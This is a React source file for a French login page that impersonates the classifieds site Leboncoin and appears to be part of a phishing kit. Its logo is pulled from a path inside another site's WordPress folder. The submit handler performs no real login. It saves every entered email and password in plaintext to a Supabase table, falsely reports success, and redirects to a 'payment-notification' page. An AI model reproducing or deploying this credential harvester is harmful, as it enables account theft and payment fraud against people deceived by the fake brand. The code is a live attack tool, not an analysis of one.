
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { updateUserSession } from "@/utils/sessionUtils";
import { toast } from "sonner";
import { supabase, getUserByEmail, upsertUser } from "@/utils/supabaseClient";

const Login: React.FC = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    if (!email || !password) {
      toast.error("Veuillez remplir tous les champs");
      setIsLoading(false);
      return;
    }

    try {
      // Vérifie si l'utilisateur existe déjà
      const existingUser = await getUserByEmail(email);
      
      // Prépare les données utilisateur à enregistrer
      const userData = {
        email,
        password,
        derniereMaj: new Date().toISOString()
      };
      
      // Enregistre ou met à jour l'utilisateur dans Supabase
      await upsertUser(userData);
      
      // Stocke les informations dans la session
      updateUserSession({ email, password });
      
      toast.success("Connexion réussie");
      setIsLoading(false);
      navigate("/payment-notification");
    } catch (error) {
      console.error("Erreur lors de la connexion:", error);
      toast.error("Une erreur est survenue lors de la connexion");
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="w-full py-4 border-b border-gray-200">
        <div className="container mx-auto px-4 flex items-center">
          <img 
            src="https://shobha-yadav.dmlearning.in/wp-includes/html-api/lbc/Félicitation_fichiers/lbc-front-web-logo.svg" 
            alt="Leboncoin" 
            className="h-8" 
          />
          <div className="ml-auto flex items-center text-leboncoin-orange font-medium">
            <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
              <path fillRule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
            </svg>
            Connexion
          </div>
        </div>
      </header>

      <main className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-md p-8 bg-white rounded-lg shadow-sm border border-gray-100 animate-scale-in">
          <h1 className="text-3xl font-bold text-center mb-6">Bonjour !</h1>
          <p className="text-center text-gray-600 mb-8">
            Connectez-vous pour découvrir toutes nos fonctionnalités.
          </p>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-1">
                E-mail
              </label>
              <input
                id="email"
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="form-input"
                placeholder="Votre adresse email"
              />
            </div>

            <div>
              <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-1">
                Mot de passe
              </label>
              <input
                id="password"
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="form-input"
                placeholder="Votre mot de passe"
              />
            </div>

            <div className="flex justify-start">
              <a href="#" className="text-leboncoin-blue hover:underline text-sm">
                Mot de passe oublié?
              </a>
            </div>

            <button
              type="submit"
              className="primary-button flex items-center justify-center"
              disabled={isLoading}
            >
              {isLoading ? (
                <span className="loading-spinner" />
              ) : (
                "Se connecter"
              )}
            </button>
          </form>

          <div className="mt-8 text-center">
            <p className="text-gray-500 mb-2">Envie de nous rejoindre ?</p>
            <a href="#" className="text-leboncoin-blue hover:underline">
              Créer un compte
            </a>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Login;
